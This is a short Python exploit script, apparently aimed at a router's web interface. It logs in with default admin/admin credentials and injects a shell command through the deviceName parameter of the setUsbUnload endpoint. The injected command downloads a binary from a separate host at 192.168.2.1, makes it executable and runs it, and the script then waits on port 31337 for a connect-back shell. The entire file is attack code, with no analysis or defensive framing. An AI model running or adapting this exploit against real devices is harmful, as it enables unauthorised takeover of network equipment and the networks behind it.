#!/usr/bin/python3

from pwn import *
import requests
from threading import Thread

cmd  = b'wget http://192.168.2.1:8000/tools/msf -O /msf;'
cmd += b'chmod 777 /msf;'
cmd += b'/msf'

assert(len(cmd) < 255)

url = b"http://192.168.2.2/login/Auth"
payload = b"http://192.168.2.2/goform/setUsbUnload/?deviceName=;%20" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    s.post(url=url, data=data)
    s.post(url=payload, data=data)

thread = Thread(target=attack)
thread.start()

io = listen(31337)
io.wait_for_connection()
log.success("getshell")
io.interactive()
